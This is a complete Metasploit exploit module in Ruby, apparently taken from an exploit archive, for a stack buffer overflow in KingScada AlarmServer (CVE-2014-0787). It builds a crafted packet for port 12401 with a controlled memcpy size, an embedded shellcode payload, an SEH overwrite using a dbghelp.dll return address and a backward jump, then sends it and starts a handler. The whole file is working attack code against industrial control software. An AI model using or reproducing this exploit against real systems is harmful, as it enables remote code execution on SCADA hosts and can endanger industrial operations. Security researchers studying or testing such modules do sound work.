 
class MetasploitModule < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Remote::Seh
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;KingScada AlarmServer Stack Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a stack based buffer overflow found in
                KingScada < 3.1.2.13. The vulnerability is triggered when
                sending a specially crafted packet to the &#039;AlarmServer&#039;
                (AEserver.exe) service listening on port 12401. During the
                parsing of the packet the 3rd dword is used as a size value
                for a memcpy operation which leads to an overflown stack buffer
            },
            &#039;Author&#039;         => [ &#039;James Fitts&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2014-0787&#039; ],
                    [ &#039;ZDI&#039;, &#039;14-071&#039; ],
                    [ &#039;URL&#039;, &#039;http://ics-cert.us-cert.gov/advisories/ICSA-14-098-02&#039; ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 1000,
                    &#039;BadChars&#039; => "\x00\x0a\x0d\x20",
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [
                        &#039;Windows XP SP3 EN / WellinTech KingScada 31.1.1.4&#039;, 
                            {
                                # dbghelp.dll
                                # pop esi/ pop edi/ retn
                                &#039;ret&#039; => 0x02881fbf,
                            } 
                    ],
                ],
            &#039;DefaultTarget&#039; => 0,
            &#039;DisclosureDate&#039; => &#039;Apr 10, 2014&#039;))
 
        register_options([Opt::RPORT(12401)], self.class)
    end
 
    def exploit
        connect
 
        p = payload.encoded
 
        buf = make_nops(5000)
        buf[0, 4] = [0x000004d2].pack(&#039;V&#039;)
        buf[4, 4] = [0x0000007b].pack(&#039;V&#039;)
        buf[8, 4] = [0x0000133c].pack(&#039;V&#039;)  # size for memcpy()
        buf[1128, p.length] = p
        buf[2128, 8] = generate_seh_record(target[&#039;ret&#039;])
        buf[2136, 5] = "\xe9\x4b\xfb\xff\xff"   # jmp $-1200
 
        print_status("Trying target #{target.name}...")
 
        sock.put(buf)
 
        handler
        disconnect
    end
 
end

